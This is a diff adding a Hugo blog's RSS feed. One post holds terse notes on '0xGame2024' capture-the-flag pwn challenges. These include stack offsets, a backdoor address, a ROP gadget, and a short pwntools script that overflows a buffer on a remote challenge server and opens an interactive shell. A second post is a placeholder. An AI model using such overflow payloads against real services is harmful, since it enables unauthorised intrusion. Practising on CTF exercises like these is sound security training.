@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>My New Hugo Site</title>
+    <link>https://example.org/</link>
+    <description>Recent content on My New Hugo Site</description>
+    <generator>Hugo -- 0.134.3</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 01 Jan 0001 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://example.org/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title></title>
+      <link>https://example.org/posts/0xgame2024/0xgame2024/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://example.org/posts/0xgame2024/0xgame2024/</guid>
+      <description>&lt;p&gt;PWN
+1.testyourpwntool
+&lt;img loading=&#34;lazy&#34; src=&#34;image-20241006161025822.png&#34; alt=&#34;&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;2.stackoverflow
+00007ffdad8c5320
+00007ffdad8c5358
+38
+backdoor：4012bd&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20241006180731272.png&#34; alt=&#34;&#34;  /&gt;
+
+from pwn import *
+io = remote(&amp;lsquo;47.97.58.52&amp;rsquo;, 40001)
+payload=b&amp;rsquo;a&amp;rsquo;*0x38+p64(0x00000000004012BD)
+io.send(payload)
+io.send(b&amp;rsquo;a&amp;rsquo;*0x38+p64(0x00000000004012BD))
+io.send(&amp;rsquo;\n&amp;rsquo;)
+io.interactive()&lt;/p&gt;
+&lt;p&gt;8530
+8600&lt;/p&gt;
+&lt;p&gt;c960
+c890
+d0&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20241006202956597.png&#34; alt=&#34;&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;5.whereismybinsh&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20241008115415709.png&#34; alt=&#34;&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;pop_rdi_ret:0x0000000000401323&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20241008120813482.png&#34; alt=&#34;&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;4.find_me
+尝试ioexp
+查看libc.so.6版本&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title></title>
+      <link>https://example.org/posts/test/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://example.org/posts/test/</guid>
+      <description>&lt;h1 id=&#34;hellohugo&#34;&gt;Hello,Hugo&lt;/h1&gt;
+&lt;p&gt;你好，纸&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;icons8-kali-linux-48.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;windows-11-bloom-ai-3840x2160-16077.jpg&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
